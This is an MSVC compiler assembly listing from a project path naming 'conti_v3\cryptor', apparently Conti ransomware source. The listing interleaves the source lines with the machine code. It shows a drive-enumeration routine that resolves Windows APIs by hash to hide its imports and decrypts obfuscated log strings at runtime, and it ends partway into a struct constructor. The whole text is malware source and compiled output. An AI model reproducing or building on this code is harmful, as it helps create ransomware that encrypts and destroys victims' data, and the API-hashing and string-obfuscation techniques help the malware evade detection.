; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
;	COMDAT ?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
_TEXT	SEGMENT
$T7 = 32
$T8 = 144
DriveList$ = 144
mem$1$ = 152
?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z PROC ; filesystem::EnumirateDrives, COMDAT

; 8    : {

$LN209:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	57		 push	 rdi
  00004	41 54		 push	 r12
  00006	41 56		 push	 r14
  00008	41 57		 push	 r15
  0000a	48 8b ec	 mov	 rbp, rsp
  0000d	48 83 ec 58	 sub	 rsp, 88			; 00000058H

; 9    : 	INT Length = 0;
; 10   : 	INT DrivesCount = 0;

  00011	33 c0		 xor	 eax, eax

; 12   : 	TAILQ_INIT(DriveList);

  00013	48 89 49 08	 mov	 QWORD PTR [rcx+8], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  00017	41 b8 26 1b 37
	e6		 mov	 r8d, -432596186		; e6371b26H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 12   : 	TAILQ_INIT(DriveList);

  0001d	48 89 01	 mov	 QWORD PTR [rcx], rax
  00020	4c 8b f9	 mov	 r15, rcx
  00023	44 8b e0	 mov	 r12d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  00026	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00029	44 8d 48 6b	 lea	 r9d, QWORD PTR [rax+107]
  0002d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 71   : 	return pFunction(nBufferLength, lpBuffer);

  00032	33 d2		 xor	 edx, edx
  00034	33 c9		 xor	 ecx, ecx
  00036	ff d0		 call	 rax
  00038	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 15   : 	if (!BufferLength) {

  0003a	85 c0		 test	 eax, eax
  0003c	0f 84 38 03 00
	00		 je	 $LN191@EnumirateD

; 16   : 		return 0;
; 17   : 	}
; 18   : 
; 19   : 	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + 1) * sizeof(WCHAR));

  00042	48 8d 1c 7d 02
	00 00 00	 lea	 rbx, QWORD PTR [rdi*2+2]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  0004a	48 8b cb	 mov	 rcx, rbx
  0004d	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00052	4c 8b c3	 mov	 r8, rbx
  00055	48 89 45 40	 mov	 QWORD PTR mem$1$[rbp-88], rax
  00059	33 d2		 xor	 edx, edx
  0005b	48 8b c8	 mov	 rcx, rax
  0005e	4c 8b f0	 mov	 r14, rax
  00061	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 20   : 	if (!Buffer) {

  00066	4d 85 f6	 test	 r14, r14
  00069	0f 84 0b 03 00
	00		 je	 $LN191@EnumirateD
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  0006f	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 20   : 	if (!Buffer) {

  00074	48 89 b4 24 a0
	00 00 00	 mov	 QWORD PTR [rsp+160], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  0007c	41 b8 26 1b 37
	e6		 mov	 r8d, -432596186		; e6371b26H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 20   : 	if (!Buffer) {

  00082	4c 89 6c 24 50	 mov	 QWORD PTR [rsp+80], r13
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  00087	44 8d 4a 5c	 lea	 r9d, QWORD PTR [rdx+92]
  0008b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 71   : 	return pFunction(nBufferLength, lpBuffer);

  00090	49 8b d6	 mov	 rdx, r14
  00093	8b cf		 mov	 ecx, edi
  00095	ff d0		 call	 rax

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  00097	ba 0f 00 00 00	 mov	 edx, 15
  0009c	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 26   : 	LPWSTR tempBuffer = Buffer;

  000a2	49 8b f6	 mov	 rsi, r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  000a5	44 8d 4a 5d	 lea	 r9d, QWORD PTR [rdx+93]
  000a9	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 61   : 	return pFunction(lpString);

  000ae	49 8b ce	 mov	 rcx, r14
  000b1	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 28   : 	while (Length = (INT)plstrlenW(tempBuffer)) {

  000b3	33 db		 xor	 ebx, ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 61   : 	return pFunction(lpString);

  000b5	44 8b e8	 mov	 r13d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 28   : 	while (Length = (INT)plstrlenW(tempBuffer)) {

  000b8	85 c0		 test	 eax, eax
  000ba	0f 84 ca 00 00
	00		 je	 $LN6@EnumirateD
$LL5@EnumirateD:

; 29   : 
; 30   : 		PDRIVE_INFO DriveInfo = new DRIVE_INFO;

  000c0	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  000c5	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000ca	0f 57 c0	 xorps	 xmm0, xmm0
  000cd	48 8b f8	 mov	 rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  000d0	48 c7 c2 ff ff
	ff ff		 mov	 rdx, -1

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  000d7	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  000da	48 89 58 10	 mov	 QWORD PTR [rax+16], rbx

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  000de	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  000e6	66 89 18	 mov	 WORD PTR [rax], bx
  000e9	0f 1f 80 00 00
	00 00		 npad	 7
$LL193@EnumirateD:

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  000f0	48 ff c2	 inc	 rdx
  000f3	66 83 3c 56 00	 cmp	 WORD PTR [rsi+rdx*2], 0
  000f8	75 f6		 jne	 SHORT $LL193@EnumirateD

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  000fa	48 83 fa 07	 cmp	 rdx, 7
  000fe	77 2e		 ja	 SHORT $LN46@EnumirateD

; 2244 :         return _Myres > _Small_string_capacity;

  00100	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7

; 2226 :         value_type* _Result = _Bx._Buf;

  00105	4c 8b f7	 mov	 r14, rdi

; 2227 :         if (_Large_mode_engaged()) {

  00108	76 03		 jbe	 SHORT $LN49@EnumirateD

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0010a	4c 8b 30	 mov	 r14, QWORD PTR [rax]
$LN49@EnumirateD:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0010d	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00111	48 89 50 10	 mov	 QWORD PTR [rax+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00115	4c 8b c3	 mov	 r8, rbx
  00118	48 8b d6	 mov	 rdx, rsi
  0011b	49 8b ce	 mov	 rcx, r14
  0011e	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00123	33 c0		 xor	 eax, eax
  00125	66 42 89 04 33	 mov	 WORD PTR [rbx+r14], ax

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  0012a	33 db		 xor	 ebx, ebx
  0012c	eb 0b		 jmp	 SHORT $LN9@EnumirateD
$LN46@EnumirateD:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  0012e	4c 8b ce	 mov	 r9, rsi
  00131	48 8b cf	 mov	 rcx, rdi
  00134	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN9@EnumirateD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 39   : 		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

  00139	48 89 5f 20	 mov	 QWORD PTR [rdi+32], rbx
  0013d	48 8d 4f 20	 lea	 rcx, QWORD PTR [rdi+32]
  00141	49 8b 47 08	 mov	 rax, QWORD PTR [r15+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  00145	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 39   : 		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

  0014a	48 89 47 28	 mov	 QWORD PTR [rdi+40], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  0014e	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 39   : 		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

  00154	49 8b 47 08	 mov	 rax, QWORD PTR [r15+8]

; 40   : 
; 41   : 		DrivesCount++;

  00158	41 ff c4	 inc	 r12d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  0015b	44 8d 4a 5d	 lea	 r9d, QWORD PTR [rdx+93]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 39   : 		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

  0015f	48 89 38	 mov	 QWORD PTR [rax], rdi

; 42   : 		tempBuffer += Length + 1;

  00162	41 8d 45 01	 lea	 eax, DWORD PTR [r13+1]
  00166	49 89 4f 08	 mov	 QWORD PTR [r15+8], rcx
  0016a	48 63 c8	 movsxd	 rcx, eax
  0016d	48 8d 34 4e	 lea	 rsi, QWORD PTR [rsi+rcx*2]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  00171	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 61   : 	return pFunction(lpString);

  00176	48 8b ce	 mov	 rcx, rsi
  00179	ff d0		 call	 rax
  0017b	44 8b e8	 mov	 r13d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 28   : 	while (Length = (INT)plstrlenW(tempBuffer)) {

  0017e	85 c0		 test	 eax, eax
  00180	0f 85 3a ff ff
	ff		 jne	 $LL5@EnumirateD
  00186	4c 8b 75 40	 mov	 r14, QWORD PTR mem$1$[rbp-88]
$LN6@EnumirateD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0018a	c6 45 c8 00	 mov	 BYTE PTR $T7[rbp-88], 0
  0018e	c6 45 c9 30	 mov	 BYTE PTR $T7[rbp-87], 48 ; 00000030H
  00192	c6 45 ca 6a	 mov	 BYTE PTR $T7[rbp-86], 106 ; 0000006aH
  00196	c6 45 cb 70	 mov	 BYTE PTR $T7[rbp-85], 112 ; 00000070H
  0019a	c6 45 cc 6a	 mov	 BYTE PTR $T7[rbp-84], 106 ; 0000006aH
  0019e	c6 45 cd 4e	 mov	 BYTE PTR $T7[rbp-83], 78 ; 0000004eH
  001a2	c6 45 ce 6a	 mov	 BYTE PTR $T7[rbp-82], 106 ; 0000006aH

; 58   :         return m_isDecrypted;

  001a6	4c 8b 6c 24 50	 mov	 r13, QWORD PTR [rsp+80]
  001ab	48 8b b4 24 a0
	00 00 00	 mov	 rsi, QWORD PTR [rsp+160]

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  001b3	c6 45 cf 21	 mov	 BYTE PTR $T7[rbp-81], 33 ; 00000021H
  001b7	c6 45 d0 6a	 mov	 BYTE PTR $T7[rbp-80], 106 ; 0000006aH
  001bb	c6 45 d1 05	 mov	 BYTE PTR $T7[rbp-79], 5
  001bf	c6 45 d2 6a	 mov	 BYTE PTR $T7[rbp-78], 106 ; 0000006aH
  001c3	c6 45 d3 5e	 mov	 BYTE PTR $T7[rbp-77], 94 ; 0000005eH
  001c7	c6 45 d4 6a	 mov	 BYTE PTR $T7[rbp-76], 106 ; 0000006aH
  001cb	c6 45 d5 6c	 mov	 BYTE PTR $T7[rbp-75], 108 ; 0000006cH
  001cf	c6 45 d6 6a	 mov	 BYTE PTR $T7[rbp-74], 106 ; 0000006aH
  001d3	c6 45 d7 05	 mov	 BYTE PTR $T7[rbp-73], 5
  001d7	c6 45 d8 6a	 mov	 BYTE PTR $T7[rbp-72], 106 ; 0000006aH
  001db	c6 45 d9 5e	 mov	 BYTE PTR $T7[rbp-71], 94 ; 0000005eH
  001df	c6 45 da 6a	 mov	 BYTE PTR $T7[rbp-70], 106 ; 0000006aH
  001e3	c6 45 db 05	 mov	 BYTE PTR $T7[rbp-69], 5
  001e7	c6 45 dc 6a	 mov	 BYTE PTR $T7[rbp-68], 106 ; 0000006aH
  001eb	c6 45 dd 5f	 mov	 BYTE PTR $T7[rbp-67], 95 ; 0000005fH
  001ef	c6 45 de 6a	 mov	 BYTE PTR $T7[rbp-66], 106 ; 0000006aH
  001f3	c6 45 df 13	 mov	 BYTE PTR $T7[rbp-65], 19
  001f7	c6 45 e0 6a	 mov	 BYTE PTR $T7[rbp-64], 106 ; 0000006aH
  001fb	c6 45 e1 1e	 mov	 BYTE PTR $T7[rbp-63], 30
  001ff	c6 45 e2 6a	 mov	 BYTE PTR $T7[rbp-62], 106 ; 0000006aH
  00203	c6 45 e3 54	 mov	 BYTE PTR $T7[rbp-61], 84 ; 00000054H
  00207	c6 45 e4 6a	 mov	 BYTE PTR $T7[rbp-60], 106 ; 0000006aH
  0020b	c6 45 e5 2f	 mov	 BYTE PTR $T7[rbp-59], 47 ; 0000002fH
  0020f	c6 45 e6 6a	 mov	 BYTE PTR $T7[rbp-58], 106 ; 0000006aH
  00213	c6 45 e7 74	 mov	 BYTE PTR $T7[rbp-57], 116 ; 00000074H
  00217	c6 45 e8 6a	 mov	 BYTE PTR $T7[rbp-56], 106 ; 0000006aH
  0021b	c6 45 e9 5e	 mov	 BYTE PTR $T7[rbp-55], 94 ; 0000005eH
  0021f	c6 45 ea 6a	 mov	 BYTE PTR $T7[rbp-54], 106 ; 0000006aH
  00223	c6 45 eb 6a	 mov	 BYTE PTR $T7[rbp-53], 106 ; 0000006aH
  00227	c6 45 ec 6a	 mov	 BYTE PTR $T7[rbp-52], 106 ; 0000006aH
  0022b	0f b6 45 c9	 movzx	 eax, BYTE PTR $T7[rbp-87]

; 58   :         return m_isDecrypted;

  0022f	0f b6 45 c8	 movzx	 eax, BYTE PTR $T7[rbp-88]

; 63   :         if (!isDecrypted())

  00233	84 c0		 test	 al, al
  00235	75 5a		 jne	 SHORT $LN131@EnumirateD

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00237	4c 8b c3	 mov	 r8, rbx
  0023a	66 0f 1f 44 00
	00		 npad	 6
$LL132@EnumirateD:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00240	42 0f b6 4c 05
	c9		 movzx	 ecx, BYTE PTR $T7[rbp+r8-87]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00246	b8 6a 00 00 00	 mov	 eax, 106		; 0000006aH
  0024b	2b c1		 sub	 eax, ecx
  0024d	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00250	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00255	f7 e9		 imul	 ecx
  00257	03 d1		 add	 edx, ecx
  00259	c1 fa 06	 sar	 edx, 6
  0025c	8b c2		 mov	 eax, edx
  0025e	c1 e8 1f	 shr	 eax, 31
  00261	03 d0		 add	 edx, eax
  00263	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00266	2b c8		 sub	 ecx, eax
  00268	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0026d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00270	f7 e9		 imul	 ecx
  00272	03 d1		 add	 edx, ecx
  00274	c1 fa 06	 sar	 edx, 6
  00277	8b c2		 mov	 eax, edx
  00279	c1 e8 1f	 shr	 eax, 31
  0027c	03 d0		 add	 edx, eax
  0027e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00281	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00283	42 88 4c 05 c9	 mov	 BYTE PTR $T7[rbp+r8-87], cl
  00288	49 ff c0	 inc	 r8
  0028b	49 83 f8 24	 cmp	 r8, 36			; 00000024H
  0028f	72 af		 jb	 SHORT $LL132@EnumirateD
$LN131@EnumirateD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 46   : 	logs::Write(OBFW(L"Found %d drives: "), DrivesCount);

  00291	41 8b d4	 mov	 edx, r12d
  00294	48 8d 4d c9	 lea	 rcx, QWORD PTR $T7[rbp-87]
  00298	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 47   : 
; 48   : 	PDRIVE_INFO DriveInfo = NULL;
; 49   : 	TAILQ_FOREACH(DriveInfo, DriveList, Entries) {

  0029d	49 8b 1f	 mov	 rbx, QWORD PTR [r15]
  002a0	48 85 db	 test	 rbx, rbx
  002a3	0f 84 b8 00 00
	00		 je	 $LN11@EnumirateD
  002a9	45 33 f6	 xor	 r14d, r14d
  002ac	0f 1f 40 00	 npad	 4
$LL12@EnumirateD:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  002b0	48 83 7b 18 07	 cmp	 QWORD PTR [rbx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  002b5	4c 8b cb	 mov	 r9, rbx

; 2236 :         if (_Large_mode_engaged()) {

  002b8	76 03		 jbe	 SHORT $LN144@EnumirateD

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  002ba	4c 8b 0b	 mov	 r9, QWORD PTR [rbx]
$LN144@EnumirateD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002bd	44 88 75 38	 mov	 BYTE PTR $T8[rbp-88], r14b
  002c1	c6 45 39 1a	 mov	 BYTE PTR $T8[rbp-87], 26
  002c5	c6 45 3a 57	 mov	 BYTE PTR $T8[rbp-86], 87 ; 00000057H
  002c9	c6 45 3b 2d	 mov	 BYTE PTR $T8[rbp-85], 45 ; 0000002dH
  002cd	c6 45 3c 57	 mov	 BYTE PTR $T8[rbp-84], 87 ; 00000057H
  002d1	c6 45 3d 57	 mov	 BYTE PTR $T8[rbp-83], 87 ; 00000057H
  002d5	c6 45 3e 57	 mov	 BYTE PTR $T8[rbp-82], 87 ; 00000057H
  002d9	0f b6 45 39	 movzx	 eax, BYTE PTR $T8[rbp-87]

; 58   :         return m_isDecrypted;

  002dd	0f b6 45 38	 movzx	 eax, BYTE PTR $T8[rbp-88]

; 63   :         if (!isDecrypted())

  002e1	84 c0		 test	 al, al
  002e3	75 5f		 jne	 SHORT $LN164@EnumirateD

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  002e5	4d 8b c6	 mov	 r8, r14
  002e8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL165@EnumirateD:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002f0	42 0f b6 4c 05
	39		 movzx	 ecx, BYTE PTR $T8[rbp+r8-87]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002f6	b8 57 00 00 00	 mov	 eax, 87			; 00000057H
  002fb	2b c1		 sub	 eax, ecx
  002fd	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00300	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00305	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00308	f7 e9		 imul	 ecx
  0030a	03 d1		 add	 edx, ecx
  0030c	c1 fa 06	 sar	 edx, 6
  0030f	8b c2		 mov	 eax, edx
  00311	c1 e8 1f	 shr	 eax, 31
  00314	03 d0		 add	 edx, eax
  00316	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00319	2b c8		 sub	 ecx, eax
  0031b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00320	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00323	f7 e9		 imul	 ecx
  00325	03 d1		 add	 edx, ecx
  00327	c1 fa 06	 sar	 edx, 6
  0032a	8b c2		 mov	 eax, edx
  0032c	c1 e8 1f	 shr	 eax, 31
  0032f	03 d0		 add	 edx, eax
  00331	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00334	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00336	42 88 4c 05 39	 mov	 BYTE PTR $T8[rbp+r8-87], cl
  0033b	49 ff c0	 inc	 r8
  0033e	49 83 f8 06	 cmp	 r8, 6
  00342	72 ac		 jb	 SHORT $LL165@EnumirateD
$LN164@EnumirateD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp

; 50   : 		logs::Write(OBFW(L"%s"), DriveInfo->RootPath.c_str());

  00344	49 8b d1	 mov	 rdx, r9
  00347	48 8d 4d 39	 lea	 rcx, QWORD PTR $T8[rbp-87]
  0034b	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write
  00350	48 8b 5b 20	 mov	 rbx, QWORD PTR [rbx+32]
  00354	48 85 db	 test	 rbx, rbx
  00357	0f 85 53 ff ff
	ff		 jne	 $LL12@EnumirateD
  0035d	4c 8b 75 40	 mov	 r14, QWORD PTR mem$1$[rbp-88]
$LN11@EnumirateD:

; 51   : 	}
; 52   : 
; 53   : 	free(Buffer);

  00361	49 8b ce	 mov	 rcx, r14
  00364	e8 00 00 00 00	 call	 free

; 54   : 	return DrivesCount;

  00369	41 8b c4	 mov	 eax, r12d

; 55   : }

  0036c	48 83 c4 58	 add	 rsp, 88			; 00000058H
  00370	41 5f		 pop	 r15
  00372	41 5e		 pop	 r14
  00374	41 5c		 pop	 r12
  00376	5f		 pop	 rdi
  00377	5b		 pop	 rbx
  00378	5d		 pop	 rbp
  00379	c3		 ret	 0
$LN191@EnumirateD:

; 21   : 		return 0;

  0037a	33 c0		 xor	 eax, eax

; 55   : }

  0037c	48 83 c4 58	 add	 rsp, 88			; 00000058H
  00380	41 5f		 pop	 r15
  00382	41 5e		 pop	 r14
  00384	41 5c		 pop	 r12
  00386	5f		 pop	 rdi
  00387	5b		 pop	 rbx
  00388	5d		 pop	 rbp
  00389	c3		 ret	 0
?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ENDP ; filesystem::EnumirateDrives
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0drive_info_@filesystem@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0drive_info_@filesystem@@QEAA@XZ PROC			; filesystem::drive_info_::drive_info_, COMDAT

; 2648 :         _My_data._Mysize = 0;

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2648 :         _My_data._Mysize = 0;

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

